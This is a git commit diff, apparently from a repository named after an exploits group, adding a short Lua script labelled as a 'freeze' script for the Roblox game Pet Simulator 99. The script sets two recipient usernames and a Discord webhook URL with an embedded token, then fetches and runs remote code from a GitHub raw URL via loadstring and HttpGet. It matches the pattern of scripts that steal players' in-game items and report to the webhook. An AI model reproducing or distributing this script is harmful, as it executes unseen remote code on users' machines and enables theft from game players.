38bbc913c33e21b1b8989d2807a0fb93f15d9e13
Zenith Exploits Empire <arshansiddiqui.msvd@gmail.com>
2025-04-18 21:42:40 +0200

    Add generated script

---
+++ ps99/petsim99freezescript.lua
@@ -0,0 +1,5 @@
+Username = "script_guy110"
+Username2 = "script_guy110"
+Webhook = "https://canary.discord.com/api/webhooks/1362865408612372862/sfx1Zz9vW1KXyrDiAPEbA_wBTktYUKdW_WKvX2_9cmUQrQLWQF4RoaWCaQOjrJJrSWGh"
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Zenith-Exploits-Empire/Final/refs/heads/main/RAW%20-%20Pet%20Simulator%2099"))()
